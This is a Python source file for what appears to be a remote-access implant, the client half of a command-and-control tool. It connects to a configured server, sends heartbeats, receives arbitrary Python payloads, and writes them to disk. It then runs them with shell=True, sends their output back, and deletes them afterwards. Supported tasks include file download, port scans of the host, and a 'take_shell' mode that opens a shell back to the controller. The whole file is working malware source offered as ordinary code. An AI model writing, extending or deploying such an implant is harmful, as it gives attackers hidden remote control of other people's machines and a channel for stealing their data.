import cfg
import socket
import sys
import os
import subprocess
import threading
import queue
import time
import base64
import ast
from base64 import b64encode


PORT        = cfg.PORT
IP          = cfg.IP_ADDR
DIR         = cfg.PATH
INTERVAL    = cfg.t_interval


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((IP, PORT))

q = queue.Queue(maxsize=0)

############# utility functions ############################
def command_dispatch(command):
    command = ast.literal_eval(command)
    payload = str(command["payload"].decode("utf-8"))
    args    = list(command["args"])
    typo    = str(command["type"])
    id      = int(command["id"])
    return payload, args, typo, id


def send_response(msg):
    # enc_msg = base64.b64encode(bytes(msg, 'utf-8'))
    # dec_msg = base64.b64decode(msg, 'utf-8')
    # print(dec_msg)

    # base64_bytes = base64.b64encode(msg.encode("ascii"))
    # base64_string = base64_bytes.decode("ascii")
    # print(base64_string)
  
    # print(f"Encoded string: {base64_string}")
    enc_msg     = str(msg).encode('utf-8')
    try:
        client.send(enc_msg)
    except socket.error:
        print ("ERROR: Could not connect to server")
        client.close()
    return


def send_data(msg):
    enc_msg     = str(msg).encode('utf-8')
    try:
        client.send(enc_msg)
    except socket.error:
        print ("ERROR: Could not connect to server")
        client.close()
    return


def send_alive():
    while(True):
        msg    =  'ack'
        msg    = msg.encode('utf-8')
        try:
            client.send(msg)
            time.sleep(INTERVAL)
        except socket.error:
            client.close()
            break
    return


####################### commands class ##################################



class command():
    def __init__(self, task):
        self.type         = task['type']
        self.exe_filepath = task['filepath']
        self.id           = task['id']
        self.args         = task['args']

    ## *************************** add here for new cmd_types!
    def set_subprocess_args(self):  
        if self.type == 'download_file':
            self.args         = [sys.executable, self.exe_filepath] + self.args
        elif self.type == 'one_port_scan':
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            self.args  = [sys.executable, self.exe_filepath, ip_address] + self.args
        elif self.type == 'ports_scan':
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            self.args  = [sys.executable, self.exe_filepath, ip_address]
        elif self.type == 'take_shell':
            ip_address = IP
            self.args  = [sys.executable, self.exe_filepath, ip_address] + self.args
        else:
            pass
    def send_data_or_file(self,data):
        if self.type == 'download_file':
            data['filename'] = self.args[3]
        send_data(data)

    ## **************************


    def run_subprocess(self):
        send_response(f"Running cmd {self.id} \n")
        p = subprocess.run(self.args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        err = p.stderr.decode()
        if err!="":
            send_response(f"Error cmd {self.id} \n")
        output = p.stdout.decode().strip('\r\n')
        return {'output':output, 'err':err, 'id':self.id}

        
    def delete_file(self):
        os.remove(self.exe_filepath)
    
    def funcs_to_run(self):
        send_response(f"Initialized cmd {self.id} \n")
        self.set_subprocess_args()
        data = self.run_subprocess()
        self.send_data_or_file(data)
        self.delete_file()
        send_response(f"Finished cmd {self.id} \n")
    
    def run_threaded(self):
        # thread   = threading.Thread(target=self.funcs_to_run)
        # thread.start
        self.funcs_to_run()
    
    


############################################################


def recieve_cmds():
    if os.getcwd()+DIR == None:
        os.mkdir(os.getcwd()+DIR)
    while True:
        try:
            data = client.recv(4096)
            data = data.decode('utf-8')
            payload, args, typo, id = command_dispatch(data)
            filename = f"file{id}.py"
            filepath = os.path.join(os.getcwd()+DIR, filename)
            print(filepath)
            with open(filepath, "w") as f:
                f.write(payload)
            f.close()

            task = {'filepath':filepath,
                    'type':typo, 
                    'id':id,
                    'args':args }

            q.put(task)
            send_response(f"Received {id} \n")

    
        except socket.error:
            client.close()
            break



def do_cmds():
    while True:
        task = q.get()
        if task == None:
            continue
        cmd = command(task)
        cmd.run_threaded()

    
    
def main():
    
    alive_thread   = threading.Thread(target=send_alive)
    alive_thread.start()

    recieve_thread   = threading.Thread(target=recieve_cmds)
    recieve_thread.daemon = True
    recieve_thread.start()

    loader_thread    = threading.Thread(target=do_cmds)
    loader_thread.start()


if __name__ == "__main__":
    main()
